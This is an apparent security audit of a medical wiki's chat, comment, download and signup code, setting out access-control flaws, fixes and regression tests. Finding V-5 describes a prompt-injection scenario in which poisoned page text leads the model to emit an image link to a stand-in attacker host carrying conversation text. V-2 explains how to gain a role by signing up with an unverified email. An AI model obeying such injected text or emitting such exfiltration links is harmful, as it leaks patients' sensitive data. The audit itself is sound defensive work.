# Chat and PII security audit, 2026-10-05

Scope: (a) a viewer who cannot read a sensitive page must never get its content, title, slug, tags, assets, search hits or comment threads through chat or any adjacent route; (b) a chat that used sensitive data must not be available to another viewer.

Method: read-only code review of `origin/main` at `0316e8a3d`, plus tests that run the **real** app handlers (`handleChatRoute`, `handleToolsRequest`, comment/download/page-copy/search handlers) against the **real** Convex functions through `convex-test`. Only the language model (scripted `MockLanguageModelV3` that records every prompt it was shown), Liveblocks (in-memory double) and the vector index (stub, `convex-test` has none) are replaced. Nothing touched production, no live model was called. Local stack (`bun run local:stack`, `local:smoke`) was used for end-to-end probes.

Shared fixture: `apps/app/server/chat-security-fixture.ts` (viewers: `anonymous` = gate-only, `reader` = signed in without a role, `care` = signed in with the care-team role; public pages, sensitive pages that a role grants, and a sensitive page that no role grants).

Every fix below is **app-only**. No Convex function was added or changed (`convex/lib/service-auth.test.ts` inventory untouched), so there is no deploy ordering constraint.

## Findings

| ID | Severity | Status | Summary |
|----|----------|--------|---------|
| V-1 | High | Confirmed, **fixed** | Full-site download included sensitive PDFs/files for any signed-in user without the role |
| V-2 | High | Confirmed, **open (design)** | Unverified signup email inherits email-pattern role grants, so a gate-password holder can claim the care-team role |
| V-3 | High | Confirmed, **fixed** | Any signed-in user could read, write and delete comment threads of sensitive pages |
| V-4 | Low | Confirmed, **fixed** | Cached chat system prompt kept serving sensitive context for up to 60 s after a role was revoked |
| V-5 | Medium (exploit needs a poisoned page) | Renderer behaviour confirmed, **fixed** | Chat answers could load cross-origin images, a prompt-injection exfiltration channel |
| D-1 | Design | Open, options below | Revoked users keep (only) their own earlier sensitive chats; conversations never expire |

### V-1 Full-site download leaks sensitive assets (High, fixed)

- Where: `apps/app/server/api/download.ts:92-130` (`listDownloadAssets`) at `0316e8a3d`; the Convex listings it calls (`convex/documents.ts` `listPdfAssetsPage`/`listFileAssetsPage`, ~1417-1490) return every asset for `includeSensitive: true` and strip `sensitive`/`ownerSlugs`.
- Exploit: anyone who passes the gate (shared password), signs up (open, see V-2) and calls `GET /api/download?type=full` receives a zip. The only filter was "is the same-named sibling page sensitive and unreadable" (`download.ts:120-130`). A sensitive PDF owned by a sensitive page under a different file name (`attachments/lab-report.pdf` embedded by `private/care-team-notes`), and any legacy asset without visibility metadata, passed it. `/api/file` (`server/api/files.ts:103-190`) applies the stricter owner rule, so the same asset was refused by `/api/file` but shipped in the zip.
- Proof: `server/download-sensitive-assets.test.ts` ("download archives omit sensitive assets the viewer cannot read, matching /api/file") failed before the fix with the reader receiving `lab-report.pdf`, `legacy.csv`, `other-owner.pdf`; passes after.
- Fix (commit `aecfaa2d9`): ownership is read from the existing `listPdfAssetVisibilityPage`/`listFileAssetVisibilityPage` queries; a sensitive asset is included only if the viewer can read every owning page (plus the legacy sibling-page rule); assets without a visibility record fail closed. Existing `wiki-api.test.ts` fake gained the visibility rows the real backend always returns.
- Local stack check: reader zip has no `private/lab-report.pdf`; care zip has it.

### V-2 Unverified email grants roles (High, open, design)

- Where: `server/api/auth.ts:261-340` (`handleAuthSignupRequest` -> `api.users.create`, no verification step) and `convex/access.ts:85-90, 346, 656, 719` (`roleMatchesEmail`: roles with "Auto-assign emails" patterns, exact address or domain, apply to any user whose email string matches).
- Exploit: a gate-password holder who knows (or guesses) a care-team address that has not registered yet, or a domain a role matches, signs up with it and immediately has that role: `read_page`, search, downloads and comments for sensitive pages. Needs: gate password, plus a role that uses `emailPatterns`, plus an address not yet registered (or a domain pattern).
- Proof: `server/signup-role-escalation.test.ts` is `test.failing`: it asserts the secure behaviour and currently fails on the last assertion (verified by running it without `.failing`: the search returns `private/care-team-notes`). When fixed, remove `.failing`.
- Not fixed on purpose (needs product decisions). Options: (1) add `emailVerifiedAt` to users, verify by emailed link (needs an email sender) and apply `emailPatterns` only to verified users; (2) drop pattern grants for exact addresses and assign roles only by admin action or invitation token; (3) cheapest stop-gap: accept signups only for addresses an admin pre-registered. Recommend (1) with (3) as an interim. Unknown from code: whether production roles use `emailPatterns`; check `roles` in the admin UI first.

### V-3 Comments on sensitive pages were open to any signed-in user (High, fixed)

- Where (all `apps/app/server/api/comments.ts` at `0316e8a3d`): `handleLiveblocksAuthRequest` 180-200 (only blocked anonymous, then `FULL_ACCESS`), `handleLiveblocksThreadsRequest` 224/277 (`includeSensitive = Boolean(session)`, one `:private` cache entry shared by all signed-in users), add-comment 398 and delete-thread 454 (no room check at all).
- Exploit: a signed-in user without the role fetched `/api/liveblocks-threads` and received every comment on `markdown:private/*` rooms, obtained a read/write room token for them, and could post to or delete any thread.
- Not reachable through chat (no tool reads comments) but it is the same data class.
- Proof: `server/comment-sensitive-access.test.ts` (4 tests) failed before, pass after.
- Fix (commit `b522211f9`): room auth, listing, add-comment and delete-thread require page access via the same sensitivity + `filterAccessibleSlugs` rule as the page; thread-listing cache is per viewer. Role changes are reflected within the 30 s listing cache TTL.

### V-4 Stale system prompt after role revocation (Low, fixed)

- Where: `apps/app/server/chat-route.ts:215-225` + `packages/chat/src/system-prompt-cache.ts:11,31` (60 s TTL keyed by user id). The prompt embeds the `index` and `wiki/diagnostics/diagnosis` pages; if either is sensitive and was readable, the revoked user's next chats within 60 s still carried it.
- Only matters if those two pages are sensitive (unknown for production). Proof: test "revoking a role takes effect on the very next chat..." failed before.
- Fix (commit `5c95de8c0`): a cache hit whose prompt embeds sensitive pages re-checks `canAccessSlug` for each such page and rebuilds (uncached) on failure; prompts with no sensitive content keep the zero-query hit. `getCachedSystemPrompt` became generic.

### V-5 Chat could load cross-origin images (Medium theoretical, fixed)

- Where: `packages/wiki-markdown/src/renderer.tsx:295` + `paths.ts:161-177` accept `http(s)://` and `//` image URLs (and raw HTML `<img>` via `rehype-raw`, `math-common.ts:132`); no CSP exists in the repo (only `files.ts:246` for sandboxed HTML assets).
- Scenario: a published page (e.g. an imported research article) containing injection text makes the model emit `![](https://attacker.example/?d=<conversation text>)`; the browser fetches it while rendering the answer, exfiltrating the conversation (including sensitive answers for a care viewer). Tool access cannot be escalated by injection (verified below), so this is the only exfiltration path found. Exploitability depends on model compliance, which I could not test without a live model.
- Fix (commit `a9a322884`): `src/chat/chat-image.tsx` allows only same-origin and `data:image/` images in chat; others render as inert text. Links still work (they need a user click). Test: `src/chat/chat-image.test.tsx`. Recommended defence in depth: a CSP with `img-src 'self' data: blob:` at the Vercel layer (could not check project headers from the repo).

### D-1 Old sensitive chats outlive access (design)

A user whose role is revoked can still list/read their own earlier conversations containing sensitive answers (`convex/conversations.ts` owner scoping is by account only). Nobody else can. Verified by characterization test "role revocation: new chats stop returning sensitive pages immediately; the owner keeps (only) their own earlier answers". Options: (1) accept (the user already saw the data; simplest); (2) on role revocation, archive or delete that user's conversations that used a sensitive tool result (needs a marker on conversations/messages, e.g. `usedSensitive`, set by the chat route when any tool result came from a sensitive page); (3) retention: purge conversations after N days (there is no cron for conversations today; `convex/crons.ts` only purges sessions/oauth). Recommend (2)+(3) if the care team wants revocation to mean "forgotten"; otherwise document (1).

### Hardening and lower-risk observations (not exploited)

- H-1 `packages/wiki-content/src/chat-tools.ts:116-127`: `read_page` re-queries with `includeSensitive: true` for any viewer, including anonymous; the "unavailable" result it can build is unreachable today because both gateways drop inaccessible sensitive pages (`chat-route.ts:76-100`, `api/tools.ts:17-24`). Safe now, but a single app-layer filter is the only barrier for that fetch. Recommend removing the second lookup.
- H-2 Convex returns sensitive rows to any signed-in caller (`includeSensitive = Boolean(session)`: `api/chat.ts:13`, `api/tools.ts:50`); access is enforced afterwards in the app (`filterPages`, `filterPotentiallySensitivePages`). Mutation check: removing the `includeSensitive` gate alone is survivable only because the second layer holds; both layers are independently tested.
- H-3 `list_pages` and `get_pages_by_tag` return titles without `applyPiiRedactions` (`chat-route.ts:448,453`; `api/tools.ts:90-110`) whereas `search_wiki`/`read_page` redact titles. Reader manifests do not redact titles either, so this is consistent with the UI; flag if titles may carry names.
- H-4 `wiki-chat-owner` is random 128-bit, `HttpOnly`, `SameSite=Lax`, `Secure` on https, host-only, and only its sha256 (site-scoped) reaches Convex (`server/chat-owner.ts`). It has no `__Host-` prefix: an attacker able to plant a cookie (sibling subdomain, XSS) could fix a victim's anonymous owner value and later read that victim's anonymous conversations. Signed-in users are immune (owner derives from account). Theoretical; consider `__Host-` naming.
- H-5 `/api/chat` does not check `site.config.enableChat` (only `/api/wiki/convex-token` does), so a site with chat disabled still serves the model to gate holders (cost, not data).
- H-6 `ChatRequestSchema` accepts client `system` messages and arbitrary `parts` (`packages/wiki-content/src/chat-route.ts:54`). A viewer only influences their own prompt. File parts are fetched by the AI SDK, which blocks literal private/loopback hosts (`validateDownloadUrl`); DNS names resolving to private IPs are not covered.
- H-7 Publisher embeddings are computed from raw source text (`packages/oncobase/src/publish.ts:171-181`), including redacted spans and sensitive pages, and sent to OpenAI. Vector hits return only slug/title/tags of pages the viewer may read, so there is no viewer-facing leak; it is an egress/redaction-policy question.
- H-8 `conversationOwner` keeps a site-wide `any` scope for service calls that omit `ownerKey` (rolling-deploy compatibility, `convex/lib/conversationAuth.ts:30-43`). The current app always passes `ownerKey` (test "every conversation call the chat route makes is bound..."). Remove the scope once no old app server runs.
- H-9 DICOM, pathology, timeline APIs (`server/api/diagnostics.ts`, `server/pathology-api.ts`) are gate-only with no sensitive/role concept. Not reachable from chat tools; confirm that is intended.
- H-10 Unsent prompts persist per tab in `sessionStorage` (`packages/chat/src/components/chat-interface.tsx:280-293`) and are not cleared on sign-out (tab-scoped, user-typed text only).
- H-11 `onError` persists/streams `Something went wrong: ${message}` (`chat-route.ts:485-493`); provider/tool error strings go only to the requester's own conversation. No page content found in them.
- Pre-existing e2e failures (not caused by this work, server mode against the local stack): `chat-nav-resilience.spec.ts:78,107` call Convex with an unauthenticated `ConvexHttpClient` (`Unauthorized`); `education-access.spec.ts:9,31,53` need education pages the fixture vault lacks; `backend-api.spec.ts:62` expects an unknown host to fail, but the local stack pins `WIKI_SITE_SLUG`.

## Verified safe

Each item has a test that fails when its guard is removed (mutation-checked; see end).

Property (a), chat tools and context (`server/chat-sensitive-access.test.ts`):
- `search_wiki`, `read_page` (also `slug#anchor`, `.md`, leading `/`), `list_pages`, `get_pages_by_tag`, `list_tags` never show a gate-only or role-less viewer sensitive bodies, titles, tags or surfaced slugs; what the model saw (system prompt, every tool output) and what streamed back are scanned. A sensitive page answers `Page not found`, identical to a missing page (no existence oracle).
- `linked_pages` of a public page omit sensitive targets; a sensitive page that no role grants is hidden even from care-team viewers.
- Vector search: the backend filters by `includeSensitive`; with a hostile backend that ignores it, the app layer still drops sensitive hits (`filterPages`).
- System prompt: a sensitive diagnosis/index page is excluded for non-role viewers and cached prompts are scoped per viewer and re-checked (V-4).
- PII: titles, excerpts and bodies from `read_page`/`search_wiki` and the system prompt are redacted (MRN, name, email); content is also redacted at publish time (`publish-api.ts:773`).
- `/api/tools` returns the same for non-role viewers and never returns a sensitive body even to care viewers (metadata + `unavailable`).
- Gate: `/api/chat`, `/api/tools`, `/api/wiki/convex-token` return 401 without the gate cookie; the education fallback is GET-only and not defined for chat/tools (`wiki-api.ts:129-146`).
- `includeSensitive` is set only from a validated session (`api/chat.ts`, `api/tools.ts`, `ai-search-route.ts`); anonymous callers never reach sensitive rows.
- Other routes (`server/reader-routes-sensitive.test.ts`): page-copy (404 for sensitive, `scope=public` never serves them, `private` cache scope), share-preview (no sensitive title/body for anyone), text search and AI search (named sensitive slugs are dropped before any model prompt).
- Prompt injection cannot widen access: tool authorization is server-side per request; chat has no comment or asset tool.
- Telemetry and logs (`chat-conversation-isolation.test.ts`, last test): a care-team chat with a sensitive answer produces spans with fixed names and numeric attributes only and writes none of the question, answer, slug, conversation id or owner key to `console.*`; `experimental_telemetry` is not enabled, and client chat perf events never leave the browser.

Property (b), conversations (`server/chat-conversation-isolation.test.ts`, `convex/lib/conversation-ownership.test.ts`, `server/chat-owner.test.ts`, `convex/lib/conversation-readers.test.ts`):
- The answer is stored under the requester's account owner key; another account, other anonymous cookie owners, a cookie-less caller, a token without an owner claim and a malformed claim see nothing through `list`, `listArchived`, `get`, `getMessages`, `getMeta`, `getStreamingState`, `getCancelState`.
- Other owners cannot cancel, clear, archive, restore, send to, disable messages of or delete the conversation, and cannot call the service-only `beginRun`/`updateStreaming`/`saveMessages`.
- A caller supplying someone else's `conversationId` to `/api/chat` runs the model on their own access and writes nothing into the victim's row (row and messages byte-identical afterwards).
- Every `api.conversations.*` call the chat route makes carries the viewer's `ownerKey`; the flusher is bound the same way; anonymous callers with no cookie get a throwaway key matching no row.
- Sign-in, sign-out, shared cookie jar between two accounts: owners follow the account; signing out returns to the cookie owner's anonymous history only.
- Legacy ownerless rows are invisible to browsers; owner-less browser tokens cannot read or create.
- Owner key derivation: site-scoped sha256, never contains the cookie, signed-in owner independent of any cookie, malformed cookies ignored; cookie is 128-bit random, `HttpOnly`, `SameSite=Lax`, `Secure` on https.
- No other module reads the chat tables: only `convex/conversations.ts`, internal-only `convex/migrations.ts`, the schema, and one operator probe that asserts denial. Admin, download and export code do not touch conversations.
- Gate-only readers: sensitive answers are never generated for them (first group above), so shared-password users cannot end up with sensitive conversations.

## Regression tests added

| File | Tests |
|------|-------|
| `server/chat-sensitive-access.test.ts` | 10 |
| `server/chat-conversation-isolation.test.ts` | 7 |
| `server/comment-sensitive-access.test.ts` | 4 |
| `server/download-sensitive-assets.test.ts` | 1 |
| `server/reader-routes-sensitive.test.ts` | 4 |
| `server/signup-role-escalation.test.ts` | 1 (`test.failing`, V-2) |
| `src/chat/chat-image.test.tsx` | 3 |
| `convex/lib/conversation-readers.test.ts` | 2 |

Mutation check (guard removed, tests must fail): chat `filterPage`/`filterPages` access check, `/api/tools` read/list/search filters, Convex `canReadDocument`, `ownerAllows`, `scope: none` handling, browser `ownerKey` taken from the argument, `ownerKey` dropped from flusher writes, owner cookie `HttpOnly`, reusable throwaway owner, PII redaction in `read_page`: all killed. Two survivors are expected defence in depth: forcing `includeSensitive: true` for anonymous in `api/chat.ts` (the second layer `canAccessSlug` still denies) and a shared prompt-cache key (the V-4 re-check still denies).

## Not verified

- A live model: whether a real model follows an injected instruction (V-5) or phrases an answer from tool errors. Tool authorization does not depend on that.
- Production data: whether `index`/`diagnosis` are sensitive (V-4), whether roles use `emailPatterns` (V-2), whether sensitive pages have comment rooms (V-3), production CSP/headers.
- Real Convex vector index and real Liveblocks behaviour (both stubbed); cookie behaviour in real browsers (header-level only).
- DICOM/pathology authorization intent (H-9).
